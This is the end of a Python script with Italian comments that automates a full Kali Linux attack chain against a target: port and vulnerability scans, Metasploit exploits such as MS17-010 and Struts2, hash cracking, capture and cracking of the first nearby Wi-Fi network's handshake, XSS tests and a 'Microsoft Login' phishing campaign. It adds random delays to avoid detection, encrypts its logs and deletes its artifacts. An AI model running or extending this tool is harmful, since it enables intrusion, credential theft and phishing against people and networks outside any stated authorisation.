            date=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            duration=DURATION,
            executive_summary="This report summarizes the security test conducted on the target system using Kali Linux tools.",
            network_results=self.generate_network_results_table(results['network_scanner']),
            vulnerability_results=self.generate_vulnerability_results_table(results['vuln_scanner']),
            exploitation_results=self.generate_exploitation_results_table(results['exploit_framework']),
            password_results=self.generate_password_results_table(results['password_cracker']),
            wireless_results=self.generate_wireless_results_table(results['wireless_security']),
            webapp_results=self.generate_webapp_results_table(results['webapp_tester']),
            social_results=self.generate_social_results_table(results['social_engineering']),
            recommendations=self.generate_recommendations(results)
        )
        
        # Salva report HTML
        with open("kali_security_report.html", "w") as f:
            f.write(report_content)
        
        logger.info("Report generated: kali_security_report.html")
        return "kali_security_report.html"

# =============================================
# FUNZIONI DI SUPPORTO
# =============================================
def random_delay(min=0.5, max=3.0):
    """Ritardo casuale per evitare pattern riconoscibili"""
    delay = random.uniform(min, max)
    time.sleep(delay)

def auto_log(message, level="INFO"):
    """Logging automatico con crittografia"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] [{level}] {message}"
    
    if ENCRYPT_LOGS:
        log_entry = cipher.encrypt(log_entry.encode()).decode()
    
    with open("kali_security_test.log", "a") as f:
        f.write(log_entry + "\n")
    
    logger.info(log_entry)

# =============================================
# ORCHESTRAZIONE PRINCIPALE PER KALI LINUX
# =============================================
def kali_main_orchestration():
    """Orchestrazione principale per Kali Linux"""
    auto_log("=== AVVIO SISTEMA DI TEST DI SICUREZZA KALI LINUX ===", "MAIN")
    auto_log("Inizializzazione strumenti Kali Linux", "MAIN")
    
    # Inizializza tutti i sistemi
    network_scanner = KaliNetworkScanner()
    vuln_scanner = KaliVulnerabilityScanner()
    exploit_framework = KaliExploitationFramework()
    password_cracker = KaliPasswordCracker()
    wireless_security = KaliWirelessSecurity()
    webapp_tester = KaliWebAppTester()
    social_engineering = KaliSocialEngineering()
    report_generator = KaliReportGenerator()
    
    # Fase 1: Scansione di rete
    auto_log("Fase 1: Scansione di rete con NMAP", "MAIN")
    network_scanner.run_nmap_scan(TARGET)
    open_ports = network_scanner.get_open_ports()
    auto_log(f"Porte aperte trovate: {len(open_ports)}", "MAIN")
    
    # Fase 2: Valutazione vulnerabilità
    auto_log("Fase 2: Valutazione vulnerabilità", "MAIN")
    if open_ports:
        # Cerca servizi web
        web_ports = [p for p in open_ports if p['service'] in ['http', 'https']]
        if web_ports:
            web_url = f"http://{TARGET}:{web_ports[0]['port']}"
            vuln_scanner.run_nikto_scan(web_url)
            vuln_scanner.run_sqlmap_scan(web_url)
    
    vulnerabilities = vuln_scanner.get_vulnerabilities()
    auto_log(f"Vulnerabilità trovate: {len(vulnerabilities)}", "MAIN")
    
    # Fase 3: Exploit
    auto_log("Fase 3: Tentativi di exploit", "MAIN")
    if vulnerabilities:
        # Cerca vulnerabilità specifiche da exploitare
        for vuln in vulnerabilities:
            if 'ms17_010' in vuln.get('output', ''):
                exploit_framework.run_exploit(TARGET, 'smb_ms17_010')
            elif 'struts2' in vuln.get('output', ''):
                exploit_framework.run_exploit(TARGET, 'apache_struts2')
    
    exploits = exploit_framework.get_exploits()
    sessions = exploit_framework.get_sessions()
    auto_log(f"Exploit tentati: {len(exploits)}, Sessioni attive: {len(sessions)}", "MAIN")
    
    # Fase 4: Password cracking
    auto_log("Fase 4: Password cracking", "MAIN")
    # Crea file hash di esempio
    with open("hashes.txt", "w") as f:
        f.write("5d41402abc4b2a76b9719d911017c592\n")  # hello
    
    password_cracker.crack_with_john("hashes.txt")
    passwords = password_cracker.get_cracked_passwords()
    auto_log(f"Password craccate: {len(passwords)}", "MAIN")
    
    # Fase 5: Sicurezza wireless
    auto_log("Fase 5: Test sicurezza wireless", "MAIN")
    if wireless_security.interfaces:
        monitor_iface = wireless_security.set_monitor_mode(wireless_security.interfaces[0])
        if monitor_iface:
            wireless_security.scan_networks(monitor_iface)
            networks = wireless_security.get_networks()
            
            if networks:
                # Prova a catturare handshake dalla prima rete
                target_network = networks[0]
                wireless_security.capture_handshake(
                    monitor_iface,
                    target_network['bssid'],
                    target_network['channel'],
                    target_network['essid']
                )
                
                handshakes = wireless_security.get_handshakes()
                if handshakes:
                    wireless_security.crack_handshake(handshakes[0], password_cracker.wordlists[0])
    
    wireless_networks = wireless_security.get_networks()
    wireless_handshakes = wireless_security.get_handshakes()
    auto_log(f"Reti wireless trovate: {len(wireless_networks)}, Handshake catturati: {len(wireless_handshakes)}", "MAIN")
    
    # Fase 6: Test applicazioni web
    auto_log("Fase 6: Test applicazioni web", "MAIN")
    if open_ports:
        web_ports = [p for p in open_ports if p['service'] in ['http', 'https']]
        if web_ports:
            web_url = f"http://{TARGET}:{web_ports[0]['port']}"
            webapp_tester.run_sqlmap_scan(web_url)
            webapp_tester.run_nikto_scan(web_url)
            webapp_tester.test_xss(web_url)
    
    web_vulnerabilities = webapp_tester.get_vulnerabilities()
    auto_log(f"Vulnerabilità web trovate: {len(web_vulnerabilities)}", "MAIN")
    
    # Fase 7: Social engineering
    auto_log("Fase 7: Test social engineering", "MAIN")
    social_engineering.create_phishing_campaign("target@example.com", "Microsoft Login")
    campaigns = social_engineering.get_campaigns()
    
    if campaigns:
        social_engineering.run_phishing_campaign(0)
        social_engineering.check_phishing_results(0)
    
    social_campaigns = social_engineering.get_campaigns()
    auto_log(f"Campagne social engineering: {len(social_campaigns)}", "MAIN")
    
    # Fase 8: Generazione report
    auto_log("Fase 8: Generazione report", "MAIN")
    
    results = {
        'network_scanner': network_scanner,
        'vuln_scanner': vuln_scanner,
        'exploit_framework': exploit_framework,
        'password_cracker': password_cracker,
        'wireless_security': wireless_security,
        'webapp_tester': webapp_tester,
        'social_engineering': social_engineering
    }
    
    report_file = report_generator.generate_report(results)
    auto_log(f"Report generato: {report_file}", "MAIN")
    
    # Fase 9: Pulizia
    auto_log("Fase 9: Pulizia file temporanei", "MAIN")
    temp_files = [
        "nmap_results.xml",
        "nikto_results.xml",
        "sqlmap_results",
        "hashes.txt",
        "msf_script.rc",
        "wireless_scan-01.csv",
        "handshake_capture-01.cap",
        "john.pot",
        "hashcat.pot"
    ]
    
    for file in temp_files:
        if os.path.exists(file):
            os.remove(file)
    
    auto_log("Pulizia completata", "MAIN")
    auto_log("=== SISTEMA DI TEST DI SICUREZZA KALI LINUX TERMINATO ===", "MAIN")

if __name__ == "__main__":
    try:
        kali_main_orchestration()
    except KeyboardInterrupt:
        auto_log("\nInterruzione manuale. Pulizia in corso...", "MAIN")
        sys.exit(0)
    except Exception as e:
        auto_log(f"Errore critico: {str(e)}", "ERROR")
        sys.exit(1)